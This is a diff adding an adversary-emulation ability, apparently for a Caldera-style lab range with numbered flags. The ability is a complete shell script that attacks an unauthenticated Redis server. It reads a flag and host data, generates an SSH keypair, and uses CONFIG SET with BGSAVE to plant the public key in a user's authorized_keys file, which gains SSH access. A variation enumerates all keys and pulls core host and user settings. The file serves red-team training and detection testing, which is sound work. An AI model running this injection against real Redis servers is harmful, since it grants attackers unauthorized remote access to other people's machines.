@@ -1,0 +1,66 @@
+- name: AETHON Redis — Unauthenticated Access and SSH Authorized Key Injection
+  description: >
+    Connects to the unauthenticated Redis instance on aethon-cache (port 6379)
+    discovered via the config.ini on aethon-dev. Reads the flag stored as a
+    Redis key, then uses Redis CONFIG SET to change the working directory and
+    db filename to write an attacker-controlled SSH public key into
+    /home/cacheops/.ssh/authorized_keys, enabling SSH access to aethon-cache.
+    Also reads the aethon:hosts hash to enumerate aethon-core hostname.
+    Generates Redis server logs: CONFIG SET and SLAVEOF command events.
+  tactic: lateral-movement
+  technique_id: T1021.004
+  technique_name: 'Remote Services: SSH'
+  singleton: false
+  repeatable: false
+  delete_payload: false
+  executors:
+  - name: sh
+    platform: linux
+    command: >
+      TARGET_HOST=$(cat /tmp/aethon_target_m4 2>/dev/null || echo "aethon-cache");
+      TARGET_PORT="6379";
+      echo "[*] Installing redis-tools if not present...";
+      which redis-cli || apt-get install -y redis-tools -qq;
+      echo "[*] Testing Redis connectivity (no auth)...";
+      redis-cli -h $TARGET_HOST -p $TARGET_PORT PING;
+      echo "[*] Reading flag4 from Redis...";
+      redis-cli -h $TARGET_HOST -p $TARGET_PORT GET "aethon:flag4";
+      echo "[*] Reading host enumeration data...";
+      redis-cli -h $TARGET_HOST -p $TARGET_PORT HGETALL "aethon:hosts";
+      echo "[*] Generating attacker SSH keypair...";
+      ssh-keygen -t ed25519 -f /tmp/attacker_m5_key -N "" -q;
+      PUB_KEY=$(cat /tmp/attacker_m5_key.pub);
+      echo "[*] Injecting SSH key via Redis CONFIG SET...";
+      PAYLOAD=$(printf "\n\n%s\n\n" "$PUB_KEY");
+      redis-cli -h $TARGET_HOST -p $TARGET_PORT CONFIG SET dir "/home/cacheops/.ssh";
+      redis-cli -h $TARGET_HOST -p $TARGET_PORT CONFIG SET dbfilename "authorized_keys";
+      redis-cli -h $TARGET_HOST -p $TARGET_PORT SET aethon_pwn "$PAYLOAD";
+      redis-cli -h $TARGET_HOST -p $TARGET_PORT BGSAVE;
+      sleep 2;
+      echo "[*] SSH key injection complete.";
+      echo "[*] Test SSH access: ssh -i /tmp/attacker_m5_key cacheops@$TARGET_HOST"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 90
+    parsers:
+    - module: plugins.atomic.app.parsers.atomic_sh
+      parserconfigs:
+      - source: validate_me
+        edge: ''
+        target: ''
+        custom_parser_vals: {}
+    cleanup:
+    - rm -f /tmp/attacker_m5_key /tmp/attacker_m5_key.pub /tmp/aethon_target_m4
+    variations:
+    - description: Enumerate all Redis keys for intelligence gathering
+      command: >
+        TARGET_HOST=$(cat /tmp/aethon_target_m4 2>/dev/null || echo "aethon-cache");
+        redis-cli -h $TARGET_HOST -p 6379 KEYS "*";
+        redis-cli -h $TARGET_HOST -p 6379 GET "aethon:config:core_host";
+        redis-cli -h $TARGET_HOST -p 6379 GET "aethon:config:core_user"
+    additional_info: {}
+  requirements: []
+  id: 4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b
